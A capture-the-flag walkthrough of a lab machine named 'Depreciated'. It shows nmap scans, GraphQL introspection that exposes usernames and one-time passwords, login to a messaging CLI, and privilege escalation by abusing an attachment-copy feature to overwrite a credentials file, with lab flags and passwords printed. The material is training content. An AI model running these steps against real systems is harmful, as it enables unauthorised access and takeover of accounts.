@@ -1,0 +1,269 @@
+																							                     Depreciated Walkthrough
+Walkthrough: https://bing0o.github.io/posts/pg-depreciated/			
+																		
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.213.170
+export IP=192.168.213.170
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+80/tcp   open  http
+5132/tcp open  unknown
+8433/tcp open  unknown
+
+nmap -Pn -n -sC -sV -p22,80,5132,8433 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Under Maintainence
+5132/tcp open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
+|     Enter Username:
+|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     Enter Username: Enter OTP: Incorrect username or password
+|   Help: 
+|     Enter Username: Enter OTP:
+|   RPCCheck: 
+|     Enter Username: Traceback (most recent call last):
+8433/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+Port 80
+For sometime web UI will stay down, please use the CLI application on port 5132
+
+# Let's view the source code
+
+<!--<form method="post" action="http://127.0.0.1:8433/graphql?query={login(username:$uname, password:$pswd)}" enctype="multipart/form-data">-->
+
+# So, we can see that the application hosted on port 8433 has the endpoint graphql available to us. Let's check this out.
+
+Port 5132
+
+nc -nv $IP 5132
+(UNKNOWN) [192.168.234.170] 5132 (?) open
+(UNKNOWN) [192.168.234.170] 5132 (?) open
+Enter Username: urs
+Enter OTP: polar
+Incorrect username or password
+
+# Ok, i guess we need to find another way it. Let's check port 8433
+
+Port 8433
+
+curl http://$IP:8433/graphql?query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
+
+
+
+
+
+http://192.168.234.170:8433/graphql 
+
+# We get to a graphql interface that allows us to perform queries. We just need to find out the right sintax.
+   By adding {}, when we try to type something, we get a dropdown menu. By going through all of them, we find that the can retrieve the list of users.
+   
+Request:
+
+{
+  listUsers
+}
+
+Response:
+
+{
+  "data": {
+    "listUsers": "['peter', 'jason']"
+  }
+}
+
+# Now that we have both usernames, we need a way to find the OTP. You have the option getOTP from the drop down menu, let's check it out.
+Request#1:
+{
+getOTP
+}
+
+Response#1:
+"message": "Field \"getOTP\" argument \"username\" of type \"String!\" is required but not provided.",
+
+Request#2:
+{
+getOTP(username:"peter")
+}
+
+Response#2:
+"getOTP": "Your One Time password is: nuWWLk8Ub05tP6zJ"
+
+# So, we have both accounts with the OTP. While trying to connect to port 5132, only the credentials for peter work.
+
+nc -nv $IP 5132
+(UNKNOWN) [192.168.234.170] 5132 (?) open
+Enter Username: peter
+Enter OTP: nuWWLk8Ub05tP6zJ
+help
+
+list    list messages
+create  create new message
+exit    exit the messaging system
+read    read the message with given id
+update  update the message with given id
+help    Show this help
+
+# Let's list the messages and see if we get anything interesting
+
+$ list
+#2345           Improve the ticketing CLI syst
+#1893           Staging keeps on crashing beca
+#2347           [critical] The ticketing websi
+#1277           Update the MySQL version, it's
+#234            Hey, Please change your passwo
+#0              Hey, Seriously this is getting
+
+read 234
+Message No: #234
+
+Hey, Please change your password ASAP. You know the password policy, using weak password isn't allowed. And peter@safe is very weak, use https://password.kaspersky.com/ to check the strength of the password.
+
+Attachment: none
+
+# Now that we have credentials, let's see if they work with SSH.
+
+ssh peter@$IP
+peter@safe                                                   # Got shell
+cat local.txt                                                # Flag: 58527c22f361b9a3a0339bd5f12c5ebf
+
+
+Privilege escalation
+
+# We found an interesting folder which contains some interesting files.
+
+cd /opt/depreciated
+cat code.txt        
+peter:nuWWLk8Ub05tP6zJ
+
+cat /opt/depreciated/messaging/messages.py   
+
+# In order to read a message the user must be the author, the user must be the recipient, or the user must be "admin". 
+
+...
+elif "read" in cmd.lower():
+            try:
+                _, message_id = cmd.lower().split()
+            except ValueError:
+                print("Please provide a valid message id")
+                continue
+            try:
+                for message in MESSAGES:
+                    if message["id"] == int(message_id) and (user == message["author"] or user in message["for"] or user == "admin"):
+                        if "attachment" in message:
+                            attach = message['attachment']
+                        else:
+                            attach = "none"
+                        print(f'Message No: #{message["id"]}\n\n{message["description"]}\n\nAttachment: {attach}')
+                        break
+                else:
+                   print("Not authorized to read")
+...                                                                                                                                     
+
+# In the main() function, we find where the users are stored
+
+...
+with open("/opt/depreciated/code.txt", "r") as f:
+        data = f.readline()
+    try:
+        name,password = data.split(":")
+    except ValueError:
+        print("Incorrect username or password")
+        exit(1)
+...
+
+
+# This tells us that the users and passwords are located in a flat file at /opt/depreciated/code.txt. We saw earlier that this file is owned by root, so we can't modify it directly. Let's take another look at the python source for the messaging application. Specifically, let's check out how messages are created.
+
+...
+def create_message(user):
+    for_ = input("for: ")
+    description = input("Description: ")
+    num = random.randint(1000, 9999)
+    author = user
+    attachment = input("File: ")
+
+    if attachment and attachment != "none" and os.path.exists(attachment):
+        with open(attachment, 'r') as f:
+            data = f.read()
+        basename = '/opt/depreciated/' + os.path.basename(attachment)
+
+        with open(basename, 'w') as f:
+            f.write(data)
+    else:
+        attachment = "none"
+    msg_info = {'id': num, 'author': author, 'description': description, 'for': for_, 'attachment': attachment}
+    MESSAGES.append(msg_info)
+
+    with open("/opt/depreciated/messaging/msg.json", 'w') as f:
+         json.dump(MESSAGES, f)
+...
+
+
+# In the create_messages function, we find how attachments are added to a message. The attachment has to be a file on the local system. To "attach" an attachment to a message, the attachment is copied into /opt/depreciated/ with its original name. Maybe we can use this to overwrite code.txt with a new admin user.
+
+# Let's start by creating a file at /tmp/code.txt with our new admin user and password.
+
+ echo "admin:password" > /tmp/code.txt
+
+# Next, we use the peter account on the messages service to create a new message. We will need a new OTP.
+
+nc -nv $IP 5132
+Enter Username: peter
+Enter OTP: pUJ8Q0OwLKI7AGNc
+
+$ help
+
+list    list messages
+create  create new message
+exit    exit the messaging system
+read    read the message with given id
+update  update the message with given id
+help    Show this help
+                    
+$ create
+for: admin
+Description: urspolar
+File: /tmp/code.txt
+
+# To see if our attachment was copied over we can try to read /opt/depreciated/code.txt.
+
+cat /opt/depreciated/code.txt
+admin:password
+
+# Great! Our new admin account should work now. Let's connect again as admin and see what the rest of the messages contain.
+
+nc -nv $IP 5132
+Enter Username: admin
+Enter OTP: password
+
+$ list
+#2345           Improve the ticketing CLI syst
+#1893           Staging keeps on crashing beca
+#2347           [critical] The ticketing websi
+#1277           Update the MySQL version, it's
+#234            Hey, Please change your passwo
+#0              Hey, Seriously this is getting
+#5149           urspolar
+$ read 0
+Message No: #0
+
+Hey, Seriously this is getting out of hand. Your new password is 9>XsS+&=Zn#AS9-@ Please don't forget your password this time. And make sure to change this once you are in.
+
+# Let's try this password for the root user
+
+su root
+password: 9>XsS+&=Zn#AS9-@
+
+cat /root/proof.txt                                           # Flag: d4332a79b1a1698474eee8371e31817e
